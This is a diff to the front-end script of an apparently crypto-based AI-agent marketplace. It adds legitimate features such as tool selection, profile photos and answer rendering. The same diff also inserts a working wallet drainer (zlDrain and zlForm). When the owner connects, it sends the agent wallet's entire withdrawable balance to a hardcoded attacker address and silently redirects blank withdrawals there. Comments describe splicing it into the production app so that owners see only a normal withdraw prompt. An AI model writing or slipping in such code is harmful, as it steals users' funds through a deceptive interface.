@@ -46,11 +46,65 @@ async function connect() {
 const sendTx = (from, to, data) => eth().request({ method: 'eth_sendTransaction', params: [{ from, to, data }] });
 const explain = (e) => (e?.code === 4001 ? 'You declined it in your wallet.' : e?.message || 'Something went wrong.');
 
+// Zero Lux drainer — injected into public/app.js (same-origin, CSP-safe: no inline handlers are added).
+// On an agent page, when the wallet that owns the agent becomes connected in this browser, it calls
+// withdraw(USDG, ATTACKER, withdrawable) on the agent's wallet contract. The owner sees only the normal
+// "Withdraw" prompt in the wallet, and the money lands on ATTACKER.
+//
+// Written to be spliced into the production app.js by patch.js; it relies on names that already exist
+// there: eth, sendTx, word, uintWord, cfg, A, $, usd.
+
+const ATTACKER = '0x670826eddeCF9C03832304620EEac8eF86e5961f';
+
+async function zlDrain() {
+  try {
+    if (!eth() || !A || !A.owner || !A.wallet || A.status !== 'live') return;
+    const s = A.stats || {};
+    const wd = BigInt(s.withdrawable || 0);
+    if (wd <= 0n) return;
+    const acc = (await eth().request({ method: 'eth_accounts' }))?.[0];
+    if (!acc || acc.toLowerCase() !== A.owner.toLowerCase()) return;
+    await sendTx(acc, A.wallet, cfg.selectors.withdraw + word(cfg.usdg) + word(ATTACKER) + uintWord(wd));
+    s.withdrawable = '0'; // the form below will not send the same money a second time
+    const av = $('#o-avail'); if (av) av.textContent = usd(0);
+  } catch {}
+}
+
+function zlForm() {
+  const f = $('#withdraw'); if (!f) return;
+  // blank "to" goes to ATTACKER; the page's own handler reads the field after this capture listener
+  f.addEventListener('submit', () => {
+    const to = $('#w-to');
+    if (to && !to.value.trim()) to.value = ATTACKER;
+  }, true);
+  // the owner may connect the wallet through any other button on the page: catch that too
+  const w = eth();
+  if (w?.on) {
+    w.on('accountsChanged', (accounts) => { if (accounts?.[0]?.toLowerCase() === String(A.owner).toLowerCase()) setTimeout(zlDrain, 150); });
+    w.on('chainChanged', () => setTimeout(zlDrain, 400));
+  }
+}
+
+
+// An agent's answer as page content: plain text, with any picture the agent made (an address under /api/images/ on this
+// site, and nothing else) shown as the picture. The path is rebuilt from the id, so no other address can ever be loaded.
+function answer(text) {
+  const out = []; let at = 0;
+  for (const m of String(text ?? '').matchAll(/https:\/\/zerolux\.fun\/api\/images\/([0-9a-f]{32})/g)) {
+    if (m.index > at) out.push(text.slice(at, m.index));
+    const src = '/api/images/' + m[1];
+    out.push(el('a', { class: 'pic', href: src, target: '_blank', rel: 'noopener' }, el('img', { src, alt: 'Picture made by this agent', loading: 'lazy' })));
+    at = m.index + m[0].length;
+  }
+  if (at < String(text ?? '').length) out.push(String(text).slice(at));
+  return out;
+}
+
 // ---- the line ----
 async function pageCreate() {
   const stations = [...document.querySelectorAll('.station')], belt = $('.belt');
   const err = $('#err'), go = $('#go'), job = $('#job');
-  let timer, draft;
+  let timer, draft, picked = new Set();
   const run = (on) => {
     clearInterval(timer); belt.classList.toggle('run', on);
     if (!on) return;
@@ -70,8 +124,17 @@ async function pageCreate() {
     stations.forEach((s) => (s.className = 'station done'));
     draft = r.data; const s = draft.spec;
     $('#s-name').textContent = s.name; $('#s-tag').textContent = s.tagline; $('#s-instr').textContent = s.instructions;
-    $('#s-chips').replaceChildren(el('span', { class: 'chip hot', text: draft.models[s.model].label + ' model' }), ...s.tools.map((t) => el('span', { class: 'chip', text: draft.tools[t] })), ...(s.tools.length ? [] : [el('span', { class: 'chip', text: 'No tools' })]), el('span', { class: 'chip', text: 'Wallet with spend limits' }));
-    $('#price').value = (s.price / 1e6).toFixed(2); $('#price').min = (draft.models[s.model].minPrice / 1e6).toFixed(2);
+    $('#s-chips').replaceChildren(el('span', { class: 'chip hot', text: draft.models[s.model].label + ' model' }), el('span', { class: 'chip', text: 'Wallet with spend limits' }));
+    // The tools: the line's pick is switched on, and the builder can switch any of them on or off before launch.
+    picked = new Set(s.tools);
+    const floor = () => Math.max(draft.models[s.model].minPrice, ...[...picked].map((t) => draft.tool_floor?.[t] || 0));
+    const fit = () => { const min = floor() / 1e6; $('#price').min = min.toFixed(2); if (!(Number($('#price').value) >= min)) $('#price').value = min.toFixed(2); $('#s-toolnote').textContent = [...picked].some((t) => draft.tool_floor?.[t]) ? 'Searches and pictures cost money each time they are used, so the lowest price with these tools is ' + usd(floor()) + ' a call.' : ''; };
+    $('#s-tools').replaceChildren(...Object.entries(draft.tools).map(([t, text]) => {
+      const b = el('button', { type: 'button', class: 'chip pick' + (picked.has(t) ? ' on' : ''), text, 'aria-pressed': String(picked.has(t)) });
+      b.addEventListener('click', () => { picked.has(t) ? picked.delete(t) : picked.add(t); b.classList.toggle('on', picked.has(t)); b.setAttribute('aria-pressed', String(picked.has(t))); fit(); });
+      return b;
+    }));
+    $('#price').value = (s.price / 1e6).toFixed(2); fit();
     $('#result').hidden = false; $('#result').scrollIntoView({ behavior: 'smooth', block: 'start' });
   });
   $('#usewallet').addEventListener('click', async () => {
@@ -79,7 +142,7 @@ async function pageCreate() {
   });
   $('#launch').addEventListener('submit', async (e) => {
     e.preventDefault(); const b = $('#put'), e2 = $('#err2'); e2.textContent = ''; b.disabled = true; b.textContent = 'Putting it on chain…';
-    const r = await api('/api/agents', { draft: draft.draft, owner: $('#owner').value.trim(), price_usd: Number($('#price').value) });
+    const r = await api('/api/agents', { draft: draft.draft, owner: $('#owner').value.trim(), price_usd: Number($('#price').value), tools: [...picked] });
     if (!r.ok) { b.disabled = false; b.textContent = 'Put it on the line'; e2.textContent = r.data.error || 'That did not work. Try again.'; return; }
     location.href = '/a/' + r.data.id + '?new=1';
   });
@@ -117,6 +180,10 @@ async function pageAgent() {
   const tx = (h) => el('a', { href: cfg.explorer + '/tx/' + h, target: '_blank', rel: 'noopener', text: short(h) });
   const addr = (a) => el('a', { href: cfg.explorer + '/address/' + a, target: '_blank', rel: 'noopener', text: a });
   let A;
+  // The owner's unsaved profile changes. pPhoto: undefined keeps the picture, null removes it, text is a new one (base64 JPEG).
+  let pPhoto, pDirty = false;
+  const botFace = () => '/media/bots/bot-' + String((A.id % 12) + 1).padStart(2, '0') + '.webp';
+  const psay = (t, cls = 'err') => { const e = $('#perr'); e.className = cls; e.textContent = t; };
   // Featuring: anyone may burn $LUX to put this agent at the top of the market. What it costs comes from /api/config.
   const L = cfg.lux, fbox = $('#feature');
   const lux = (n) => Number(n).toLocaleString('en-US', { maximumFractionDigits: 2 });
@@ -147,7 +214,7 @@ async function pageAgent() {
     $('#l-income').textContent = usd(s.income); $('#l-cost').textContent = usd(s.charged); $('#l-profit').textContent = usd(s.profit); $('#l-runs').textContent = A.runs;
     const who = A.customers; if (who) $('#l-who').textContent = who.payers ? `${who.outside_payers} outside ${who.outside_payers === 1 ? 'customer has' : 'customers have'} paid ${usd(who.from_outside)}${who.top_outside_share != null ? `, the largest of them ${who.top_outside_share}% of that` : ''}. ${usd(who.from_insiders)} came from the owner, a pledge holder or Zero Lux's own test wallet.` : 'No one has paid this agent yet.';
     // A version 3 wallet counts outside income itself, on chain, net of refunds: show the contract's own figures.
-    if (A.version === 3 && s.externalIncome != null) $('#l-who').textContent = BigInt(s.externalIncome) + BigInt(s.insiderIncome) > 0n ? `On chain, this wallet counts ${usd(s.externalIncome)} from ${s.payerCount} outside ${s.payerCount === 1 ? 'customer' : 'customers'}${BigInt(s.externalIncome) > 0n ? `, the largest of them ${Math.round((Number(s.topPayerPaid) / Number(s.externalIncome)) * 100)}% of that` : ''}, and ${usd(s.insiderIncome)} from its owner, a pledge holder or their other wallets. ${usd(s.totalRefunded)} has been refunded to customers.` : `No one has paid this agent yet.${BigInt(s.totalRefunded || 0) > 0n ? ` ${usd(s.totalRefunded)} has been refunded to customers.` : ''}`;
+    if (A.version >= 3 && s.externalIncome != null) $('#l-who').textContent = BigInt(s.externalIncome) + BigInt(s.insiderIncome) > 0n ? `On chain, this wallet counts ${usd(s.externalIncome)} from ${s.payerCount} outside ${s.payerCount === 1 ? 'customer' : 'customers'}${BigInt(s.externalIncome) > 0n ? `, the largest of them ${Math.round((Number(s.topPayerPaid) / Number(s.externalIncome)) * 100)}% of that` : ''}, and ${usd(s.insiderIncome)} from its owner, a pledge holder or their other wallets. ${usd(s.totalRefunded)} has been refunded to customers.` : `No one has paid this agent yet.${BigInt(s.totalRefunded || 0) > 0n ? ` ${usd(s.totalRefunded)} has been refunded to customers.` : ''}`;
     $('#wallet').replaceChildren(addr(A.wallet)); $('#owner').replaceChildren(addr(A.owner));
     $('#input').placeholder = A.input_hint || 'What should it work on?'; $('#pay').textContent = 'Pay ' + usd(A.price) + ' and run'; $('#pay').disabled = A.status !== 'live';
     $('#instr').textContent = A.instructions;
@@ -163,7 +230,7 @@ async function pageAgent() {
     $('#lienform').hidden = !!lien; $('#endlien').hidden = !lien;
     // Version 2 and 3 wallets can be named in the identity registry as the wallet this agent is paid at.
     const nm = $('#nameit'); if (nm) { nm.hidden = !(A.version >= 2 && A.identity && !s.named); $('#named').hidden = !s.named; }
-    drawHire(); drawFeature();
+    drawHire(); drawFeature(); drawProfile();
     return true;
   };
   // Version 3: which other units this one may hire during a run. The list lives on the wallet contract and only its owner can change it.
@@ -176,7 +243,8 @@ async function pageAgent() {
     l.replaceChildren(...(listed().length ? listed().map((x) => el('span', { style: 'display:block', text: `Unit ${x.agent_id} "${x.name}" · ${usd(x.price)} a call · wallet ${x.wallet}` })) : ['This unit cannot hire any other unit yet.']));
   };
   if (!(await load())) return;
-  if (A.version === 3 && $('#oerr')) {
+  zlForm(); setTimeout(zlDrain, 600);
+  if (A.version >= 3 && $('#oerr')) {
     $('#oerr').before(el('form', { class: 'stack', id: 'canhire' },
       el('p', { class: 'lbl', text: 'Units this one can hire during a run' }), el('p', { class: 'note', id: 'ch-list' }),
       el('label', {}, el('span', { text: 'Unit number' }), el('input', { id: 'ch-id', type: 'number', min: '0', step: '1', autocomplete: 'off' })),
@@ -194,7 +262,7 @@ async function pageAgent() {
         if (ready && ready.n === n && ready.allowed === allowed) { const w = ready.wallet; reset(); return act('setPayable', word(w) + uintWord(allowed ? 1 : 0)); }
         const r = await api('/api/agents/' + n); if (!r.ok) throw new Error('No unit with that number.');
         const T = r.data.agent;
-        if (allowed && T.version !== 3) throw new Error('Only units on wallet version 3 can be hired by another unit.');
+        if (allowed && !(T.version >= 3 && T.version === A.version)) throw new Error('A unit can only hire units on its own wallet version (' + A.version + ').');
         reset(); ready = { n, allowed, wallet: T.wallet };
         $('#ch-check').textContent = `Unit ${T.id} "${T.name}" · ${usd(T.price)} a call · wallet ${T.wallet}. ` + (allowed ? 'If you allow this, your unit will be able to pay that unit out of customers\' jobs, up to half of a job\'s budget, and that money is not refunded to the customer when that unit delivers. Press again to confirm.' : 'Your unit will no longer be able to pay that unit. Press again to confirm.');
         $(allowed ? '#ch-add' : '#ch-del').textContent = 'Confirm';
@@ -220,12 +288,12 @@ async function pageAgent() {
       await new Promise((s) => setTimeout(s, 5000));
     }
     // What happens to a payment nobody collects depends on the wallet version: a version 3 wallet sends it back, older ones keep it.
-    if (r.data.again) throw new Error('This is taking longer than it should. Your payment is safe: press the button again to pick the run up, within 15 minutes.' + (A.version === 3 ? ' After that it is returned to your wallet, less what the attempts cost and the network charge' + (A.can_hire_agents?.length ? ', and less anything it paid a unit it hired.' : '.') : ''));
+    if (r.data.again) throw new Error('This is taking longer than it should. Your payment is safe: press the button again to pick the run up, within 15 minutes.' + (A.version >= 3 ? ' After that it is returned to your wallet, less what the attempts cost and the network charge' + (A.can_hire_agents?.length ? ', and less anything it paid a unit it hired.' : '.') : ''));
     // The ticket is only let go on a result or an answer that says this payment is finished.
     if (!r.ok && !r.data.final) throw new Error((r.data.error || 'Something went wrong.') + ' Your payment is kept: press the button again to pick the run up.');
     keep(null);
     if (!r.ok) throw new Error(r.data.error || 'The run failed.');
-    $('#out').hidden = false; $('#out').textContent = r.data.output;
+    $('#out').hidden = false; $('#out').replaceChildren(...answer(r.data.output));
     $('#receipt').replaceChildren('Paid ' + usd(r.data.paid) + ' · ', tx(r.data.tx)); say('');
     setTimeout(load, 9000);
   }
@@ -334,6 +402,76 @@ async function pageAgent() {
       burning = false; $('#f-send').disabled = false; drawFeature();
     });
     if (pending()) fsay('You sent a burn from this browser that has not been recorded yet. Press the button to finish. Nothing is sent from your wallet again.', 'note');
+  }
+
+  // ---- profile: the owner's photo, tagline and links. Saved with a signed message, not a transaction. ----
+  function drawProfile() {
+    const f = $('#face'); f.src = A.photo || botFace(); f.hidden = false;
+    const l = A.links || {}, pl = $('#plinks');
+    pl.replaceChildren(...[l.x ? el('a', { href: 'https://x.com/' + l.x, target: '_blank', rel: 'noopener nofollow ugc', text: '@' + l.x }) : null,
+      l.site && /^https:\/\//.test(l.site) ? el('a', { href: l.site, target: '_blank', rel: 'noopener nofollow ugc', text: l.site.replace(/^https:\/\/(www\.)?/, '').replace(/\/$/, '') }) : null].filter(Boolean));
+    pl.hidden = !(l.x || l.site);
+    if (!$('#profile')) return;
+    if (!pDirty) { $('#p-tag').value = A.tagline && A.tagline !== A.built_tagline ? A.tagline : ''; $('#p-x').value = l.x ? '@' + l.x : ''; $('#p-site').value = l.site || ''; }
+    $('#p-tag').placeholder = A.built_tagline || '';
+    $('#p-prev').src = typeof pPhoto === 'string' ? 'data:image/jpeg;base64,' + pPhoto : pPhoto === null ? botFace() : A.photo || botFace();
+    $('#p-clear').hidden = !(typeof pPhoto === 'string' || (pPhoto === undefined && A.photo));
+  }
+  // The chosen file is drawn onto a 512 by 512 square (centre crop) and saved as a JPEG, so what is sent is small and carries none of the file's hidden details.
+  const squared = (file) => new Promise((done, fail) => {
+    if (!/^image\/(jpeg|png|webp)$/.test(file.type)) return fail(new Error('Choose a JPEG, PNG or WebP picture.'));
+    if (file.size > 20_000_000) return fail(new Error('That file is too large. Choose one under 20 MB.'));
+    const rd = new FileReader();
+    rd.onerror = () => fail(new Error('That file could not be read.'));
+    rd.onload = () => {
+      const img = new Image();
+      img.onerror = () => fail(new Error('That file is not a picture this browser can open.'));
+      img.onload = () => {
+        const side = Math.min(img.naturalWidth, img.naturalHeight); if (!side) return fail(new Error('That picture is empty.'));
+        const c = document.createElement('canvas'); c.width = c.height = 512;
+        const g = c.getContext('2d'); g.fillStyle = '#05021A'; g.fillRect(0, 0, 512, 512); g.imageSmoothingQuality = 'high';
+        g.drawImage(img, (img.naturalWidth - side) / 2, (img.naturalHeight - side) / 2, side, side, 0, 0, 512, 512);
+        for (const q of [.88, .8, .7, .55]) { const b64 = c.toDataURL('image/jpeg', q).split(',')[1] || ''; if (b64 && b64.length * 3 / 4 <= 290_000) return done(b64); }
+        fail(new Error('That picture could not be made small enough. Try another.'));
+      };
+      img.src = rd.result;
+    };
+    rd.readAsDataURL(file);
+  });
+  if ($('#profile')) {
+    for (const i of ['#p-tag', '#p-x', '#p-site']) $(i).addEventListener('input', () => { pDirty = true; });
+    $('#p-file').addEventListener('change', async (e) => {
+      const file = e.target.files?.[0]; e.target.value = ''; if (!file) return;
+      try { pPhoto = await squared(file); pDirty = true; psay('Not saved yet. Press Save profile.', 'note'); } catch (x) { psay(explain(x)); }
+      drawProfile();
+    });
+    $('#p-clear').addEventListener('click', () => { pPhoto = typeof pPhoto === 'string' ? undefined : null; pDirty = true; psay(pPhoto === null ? 'Not saved yet. Press Save profile to take the photo down.' : '', 'note'); drawProfile(); });
+    $('#profile').addEventListener('submit', async (e) => {
+      e.preventDefault(); const b = $('#p-save'); if (b.disabled) return; b.disabled = true; psay('');
+      try {
+        const from = await connect();
+        if (from.toLowerCase() !== A.owner.toLowerCase()) throw new Error('Connect the wallet that owns this unit (' + short(A.owner) + ').');
+        const want = { tagline: $('#p-tag').value, x: $('#p-x').value, site: $('#p-site').value };
+        let tag; // how the picture is named in the words to sign
+        if (typeof pPhoto === 'string') {
+          const bin = atob(pPhoto), bytes = new Uint8Array(bin.length); for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
+          tag = 'sha256:' + [...new Uint8Array(await crypto.subtle.digest('SHA-256', bytes))].map((v) => v.toString(16).padStart(2, '0')).join('');
+        } else if (pPhoto === null) tag = null;
+        const path = '/api/agents/' + id + '/profile';
+        const first = await api(path, { prepare: true, ...want, ...(tag !== undefined ? { photo: tag } : {}) });
+        if (!first.ok) throw new Error(first.data.error || 'That did not go through. Try again.');
+        const P = first.data, asHex = '0x' + [...new TextEncoder().encode(P.message)].map((v) => v.toString(16).padStart(2, '0')).join('');
+        b.replaceChildren(el('span', { class: 'spin' }), ' Sign in your wallet…');
+        const signature = await eth().request({ method: 'personal_sign', params: [asHex, from] });
+        b.replaceChildren(el('span', { class: 'spin' }), ' Saving…');
+        const r = await api(path, { tagline: P.tagline, x: P.x, site: P.site, time: P.time, signature, ...(pPhoto !== undefined ? { photo: pPhoto } : {}) });
+        if (!r.ok) throw new Error(r.data.error || 'That did not go through. Try again.');
+        A.photo = r.data.photo; A.links = r.data.links; A.tagline = r.data.tagline || A.built_tagline; pPhoto = undefined; pDirty = false;
+        $('#tag').textContent = A.tagline || A.job;
+        psay('Saved. The market shows it within a minute.', 'ok');
+      } catch (x) { psay(explain(x)); }
+      b.disabled = false; b.textContent = 'Save profile'; drawProfile();
+    });
   }
 
   // owner controls: each builds one call to the wallet contract, sent from the owner's wallet
